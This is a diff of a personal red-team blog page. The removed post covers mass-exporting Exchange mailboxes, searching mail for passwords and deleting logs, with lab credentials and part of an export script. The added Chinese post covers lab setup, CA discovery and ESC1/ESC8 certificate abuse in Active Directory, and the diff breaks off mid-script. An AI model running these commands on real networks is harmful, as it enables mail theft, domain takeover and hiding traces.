@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Exchange Export email methods, Yangsir">
+    <meta name="keywords" content="ADCS&amp;ESC1&amp;ESC8攻击方式, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Exchange Export email methods | Yangsir</title>
+    <title>ADCS&amp;ESC1&amp;ESC8攻击方式 | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/(https:/raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS&ESC1&ESC8Attack/image-20210816200335385.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Exchange Export email methods</h1>
+                    <h1 class="description center-align post-title">ADCS&amp;ESC1&amp;ESC8攻击方式</h1>
                 </div>
             </div>
         </div>
@@ -432,24 +432,28 @@
                     
                     <div class="article-tag">
                         
+                            <a href="/tags/Domain-environment/">
+                                <span class="chip bg-color">Domain environment</span>
+                            </a>
+                        
                             <a href="/tags/Redteam/">
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Exchange/">
-                                <span class="chip bg-color">Exchange</span>
+                            <a href="/tags/ADCS/">
+                                <span class="chip bg-color">ADCS</span>
                             </a>
                         
-                            <a href="/tags/Information-collection/">
-                                <span class="chip bg-color">Information collection</span>
+                            <a href="/tags/ESC1/">
+                                <span class="chip bg-color">ESC1</span>
                             </a>
                         
-                            <a href="/tags/Export-Email/">
-                                <span class="chip bg-color">Export Email</span>
+                            <a href="/tags/ESC8/">
+                                <span class="chip bg-color">ESC8</span>
                             </a>
                         
-                            <a href="/tags/Search-Email/">
-                                <span class="chip bg-color">Search Email</span>
+                            <a href="/tags/PTT/">
+                                <span class="chip bg-color">PTT</span>
                             </a>
                         
                     </div>
@@ -460,8 +464,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Tips/" class="post-category">
-                                Tips
+                            <a href="/categories/Learning-record/" class="post-category">
+                                Learning record
                             </a>
                         
                     </div>
@@ -473,28 +477,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-30
+                    2021-08-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-08-01
+                    2021-08-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.1k
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    6 Min
+                    7 Min
                 </div>
                 
 
@@ -517,262 +521,174 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Assuming that you have obtained the administrative rights of the Exchange server, what you need to do now is to search and export the emails in the server, so as to obtain more critical and sensitive information, such as looking for passwords and personal information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">利用方式Certified Pre-Owned: Abusing Active Directory Certificate Services出自于black hat2021
+https:&#x2F;&#x2F;www.blackhat.com&#x2F;us-21&#x2F;briefings&#x2F;schedule&#x2F;#certified-pre-owned-abusing-active-directory-certificate-services-23168
 
-<h2 id="Basic-information-Acquisition"><a href="#Basic-information-Acquisition" class="headerlink" title="Basic information Acquisition"></a>Basic information Acquisition</h2><pre class="line-numbers language-none"><code class="language-none">Get your tar account
+ad cs白皮书：
+https:&#x2F;&#x2F;www.specterops.io&#x2F;assets&#x2F;resources&#x2F;Certified_Pre-Owned.pdf
 
-Get-MailboxStatistics -Identity yangsir |fl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+强烈建议看下文前先过一遍议题&amp;白皮书，可以避免很多坑点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png"></p>
-<h2 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h2><h3 id="PSSession"><a href="#PSSession" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;rootkit.org\administrator&quot;
-$Pass &#x3D; ConvertTo-SecureString -AsPlainText admin!@#45 -Force
-$Credential &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
-$Session &#x3D; New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http:&#x2F;&#x2F;OWA2013&#x2F;PowerShell&#x2F; -Authentication Kerberos -Credential $Credential
-Import-PSSession $Session -AllowClobber<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><h3 id="PKI（Public-Key-Infrastructure公钥基础设施）"><a href="#PKI（Public-Key-Infrastructure公钥基础设施）" class="headerlink" title="PKI（Public Key Infrastructure公钥基础设施）"></a>PKI（Public Key Infrastructure公钥基础设施）</h3><pre class="line-numbers language-none"><code class="language-none">软件、加密技术、流程和服务的组合，使得组织能够保护其数据、通信、业务交易，PKI依赖于经过身份验证的用户和受信任资源之间的数字证书交换，可以用证书来保护数据并管理来自组织内外的用户和计算机身份凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.35.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">session address must be fqdn, if not fqdn will wrong like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><pre class="line-numbers language-none"><code class="language-none">一个服务器角色，提供PKI功能，支持windows域上身份和其他安全功能如文件加密、邮件加密等，可以为组织内部使用创建、验证、撤销公钥证书
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.39.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">get pssession info：
-Get-PSSession
+通俗来说ADCS角色是实施PKI解决方案，ADCS允许构建公钥基础设置并为组织提供公钥加密、数字证书、数字签名的功能
 
-stop PSSession：
-Remove-PSSession $Session
+ADCS提供所有与PKI相关的组件作为角色服务，每个角色负责证书基础架构的特定部分，同时协同完成完整解决方案<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-get account：
-Get-Mailbox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="认证机构"><a href="#认证机构" class="headerlink" title="认证机构"></a>认证机构</h4><pre class="line-numbers language-none"><code class="language-none">CA的主要目的是办法证书、撤销证书及发布授权信息方式和撤销信息，部署的第一个CA将成为PKI的根，随后可以部署位于PKI层次结构中的从属CA，根CA位于顶部，从属CA隐式信任根CA，并信任他颁布的cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.46.png"></p>
-<h3 id="Use-exchange"><a href="#Use-exchange" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">add the manager unit
-Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="证书颁发机构web注册"><a href="#证书颁发机构web注册" class="headerlink" title="证书颁发机构web注册"></a>证书颁发机构web注册</h4><pre class="line-numbers language-none"><code class="language-none">使得用户使用未加入域或运行windows以外的设备下进行证书颁发续订的操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="MSDN-info"><a href="#MSDN-info" class="headerlink" title="MSDN info"></a>MSDN info</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;powershell&#x2F;module&#x2F;exchange&#x2F;?view&#x3D;exchange-ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="Onlie-responder"><a href="#Onlie-responder" class="headerlink" title="Onlie responder"></a>Onlie responder</h4><pre class="line-numbers language-none"><code class="language-none">配置管理在线证书状态协议OCSP验证和吊销检查，在线响应程序解码特定证书的吊销状态请求，评估这些证书的状态，并返回具有请求的证书状态信息的签名响应<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="Get-all-account"><a href="#Get-all-account" class="headerlink" title="Get all account"></a>Get all account</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.50.png"></p>
-<h4 id="Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox"><a href="#Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox" class="headerlink" title="Get all mailbox information, including the number of messages, the last time to access the mailbox"></a>Get all mailbox information, including the number of messages, the last time to access the mailbox</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.58.png"></p>
-<h4 id="Get-all-ou"><a href="#Get-all-ou" class="headerlink" title="Get all ou"></a>Get all ou</h4><pre class="line-numbers language-none"><code class="language-none">Get-OrganizationalUnit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="网络设备注册服务（NDES）"><a href="#网络设备注册服务（NDES）" class="headerlink" title="网络设备注册服务（NDES）"></a>网络设备注册服务（NDES）</h4><pre class="line-numbers language-none"><code class="language-none">通过该组件，路由器交换器或其他设备可以从adcs获取证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.07.png"></p>
-<h4 id="Get-the-follow-log"><a href="#Get-the-follow-log" class="headerlink" title="Get the follow log"></a>Get the follow log</h4><pre class="line-numbers language-none"><code class="language-none">system dir 
-%ExchangeInstallPath%TransportRoles\Logs\MessageTracking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h4 id="证书注册web服务（CES）"><a href="#证书注册web服务（CES）" class="headerlink" title="证书注册web服务（CES）"></a>证书注册web服务（CES）</h4><pre class="line-numbers language-none"><code class="language-none">用于运行windows的计算机和ca之间的代理客户端，ces使用户、计算机或者应用程序能够通过使用户web服务连接到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.13.png"></p>
-<h4 id="Gets-the-sender-information-of-the-specified-sender"><a href="#Gets-the-sender-information-of-the-specified-sender" class="headerlink" title="Gets the sender information of the specified sender"></a>Gets the sender information of the specified sender</h4><pre class="line-numbers language-none"><code class="language-none">See yangsir@rootkit.org for information about all emails sent from 18:00, 28 July 2021 to present
+<h4 id="证书注册策略web服务"><a href="#证书注册策略web服务" class="headerlink" title="证书注册策略web服务"></a>证书注册策略web服务</h4><pre class="line-numbers language-none"><code class="language-none">使得用户能够获取证书注册策略信息，结合CES，可以在用户设备未加入域或无法连接域控的情况下基于策略的证书注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Get-MessageTrackingLog -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h4 id="图片介绍"><a href="#图片介绍" class="headerlink" title="图片介绍"></a>图片介绍</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172411337.png"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><pre class="line-numbers language-none"><code class="language-none">功能安装处如下选择：
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.18.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">same way to the example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+证书颁发机构
+证书颁发机构web注册
+证书注册web服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.21.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Get more easy info
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103047564.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103130284.png"></p>
+<h3 id="配置服务"><a href="#配置服务" class="headerlink" title="配置服务"></a>配置服务</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103341653.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172508459.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">如下选择进行服务的细节配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Get-MessageTrackingLog -EventID send -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103412505.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103433153.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103458913.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103527977.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103548543.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103609920.png"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103620572.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103638717.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103651916.png"></p>
+<h3 id="配置证书注册web服务"><a href="#配置证书注册web服务" class="headerlink" title="配置证书注册web服务"></a>配置证书注册web服务</h3><pre class="line-numbers language-none"><code class="language-none">上一步完成会告诉你是否要配置其他角色服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.25.png"></p>
-<h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><h3 id="PSSession-1"><a href="#PSSession-1" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">Need connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103751908.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">依次如下配置即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.30.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Adds the current user to the Mailbox Import Expor role group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103905088.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103919750.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103942267.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813103951717.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813104034198.png"></p>
+<h3 id="搭建完效果如下"><a href="#搭建完效果如下" class="headerlink" title="搭建完效果如下"></a>搭建完效果如下</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813105753003.png"></p>
+<h3 id="辅助域控搭建"><a href="#辅助域控搭建" class="headerlink" title="辅助域控搭建"></a>辅助域控搭建</h3><pre class="line-numbers language-none"><code class="language-none">这里是把adcs搭成了辅助域控<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.33.png"></p>
-<h4 id="Export-special-user"><a href="#Export-special-user" class="headerlink" title="Export  special user"></a>Export  special user</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;
-New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155635888.png"><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155651462.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">配置如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">主从复制<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-this way to export the daochu dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210813155758040.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">一步步直接操作即可，按照提示完成相关的操作即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.39.png"></p>
-<h4 id="Export-the-key-from-email"><a href="#Export-the-key-from-email" class="headerlink" title="Export the key from email"></a>Export the key from email</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;
-New-MailboxexportRequest -mailbox $User -ContentFilter &#123;(body -like &quot;*pass*&quot;)&#125; -FilePath (&quot;\\localhost\c$\daochu1\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172343449.png"></p>
+<h2 id="证书颁发机构信息获取"><a href="#证书颁发机构信息获取" class="headerlink" title="证书颁发机构信息获取"></a>证书颁发机构信息获取</h2><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">域内成员可成功定位到ca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172332440.png"><br><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172322940.png"></p>
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">获得ca名称
+<span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active
+更多细节信息
+<span class="token variable">$CAName</span> = <span class="token punctuation">(</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Active<span class="token punctuation">;</span>
+<span class="token function">Get-Itemproperty</span> <span class="token operator">-</span>Path “HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<span class="token variable">$CAName</span>”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172313339.png"></p>
+<h3 id="测试联通性"><a href="#测试联通性" class="headerlink" title="测试联通性"></a>测试联通性</h3><pre class="line-numbers language-none"><code class="language-none">确认NTLM协议（后面中继要用）
+curl http:&#x2F;&#x2F;192.168.3.73&#x2F;certsrv -I<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172301814.png"></p>
+<h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><pre class="line-numbers language-none"><code class="language-none">个人原因，ESC1在部署的另外一套环境测试，也是同样的上方部署方式即可
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.00.png"></p>
-<h4 id="Export-all-email"><a href="#Export-all-email" class="headerlink" title="Export all email"></a>Export all email</h4><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\all\&quot;+($_.name)+&quot;.pst&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+这里其实是有些坑点的，此处万分感谢李木师傅的解答~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="Export-log"><a href="#Export-log" class="headerlink" title="Export log"></a>Export log</h4><pre class="line-numbers language-none"><code class="language-none">get log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">攻击者可以在证书服务请求中指定主体名称，则请求者可以请求任何人（域管）的证书<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.04.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">you can use this way to not make log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="配置问题"><a href="#配置问题" class="headerlink" title="配置问题"></a>配置问题</h3><pre class="line-numbers language-none"><code class="language-none">进入证书模板配置<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172252110.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">如下进行配置（存在客户端身份验证就行）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172242388.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">允许注册<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172230565.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">如下配置在请求中提供<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210815172222795.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">建议拷贝个模板出来做实验!!!
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.08.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">del all log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+如此将允许低权限用户使用任意SAN请求证书，从而允许低权限用户通过kerberos或schannel作为域中任何主体进行身份验证
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.12.png"></p>
-<h4 id="PS-AUTO"><a href="#PS-AUTO" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">follow <span class="token keyword">from</span> 3gstudent 
+若允许这些设置的已发布证书模板，攻击者可以作为环境中的任何人请求证书，使用该证书为用户获取TGT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">使用漏洞发布者的工具即可
+域机器运行后如下，显示存在ESC1漏洞
 
-<span class="token keyword">function</span> UsePSSessionToExportMailfromExchange
-<span class="token punctuation">&#123;</span>
-<span class="token comment">#Requires -Version 2.0</span>
-<span class="token comment">&lt;#
-.SYNOPSIS
-This script will export the mail(.pst) from the Exchange server.
-First it will use PSSession to connect the Exchange server.
-Then it'll check the user's privilege.
-If the user is not in the "Mailbox Import Export",the script will add the user to it and reconnect the Exchange server.
-Next it will export the mail and save it.
-At last it will remove the user from the group and remove the PSSession.
-Author: 3gstudent
-.PARAMETER User
-The user to use.
-In general, you can choose the account in the domain admins.
-.PARAMETER Password
-The password of the user.
-.PARAMETER MailBox
-The mail you want to export.
-.PARAMETER ExportPath
-The export path of the mail.
-.PARAMETER ConnectionUri
-The uri of the Exchange server.
-Eg.
-    http://Exchange01.test.com/PowerShell/
-    
-.PARAMETER $Filter
-The search filter of the mail.
-.EXAMPLE
-PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;"
-#></span>
- 	<span class="token keyword">param</span> <span class="token punctuation">(</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$User</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
-		<span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>
-        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
